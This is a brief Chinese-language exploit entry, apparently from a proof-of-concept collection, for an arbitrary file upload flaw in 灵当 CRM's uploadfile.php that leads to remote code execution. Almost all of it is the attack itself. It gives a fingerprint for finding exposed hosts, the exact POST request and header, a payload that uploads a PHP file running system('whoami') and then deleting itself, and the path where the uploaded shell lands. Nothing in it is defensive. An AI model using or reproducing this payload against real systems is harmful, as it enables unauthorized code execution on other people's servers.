# 灵当CRMuploadfile.php存在任意文件上传致RCE漏洞

- **系统**：灵当　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`POST /crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
file_info={"name":"1.php"}&<?php system("whoami");unlink(__FILE__);?>
/crm/storage/2024/December/week4/回显文件名.php
```
- **预期**：200　|　—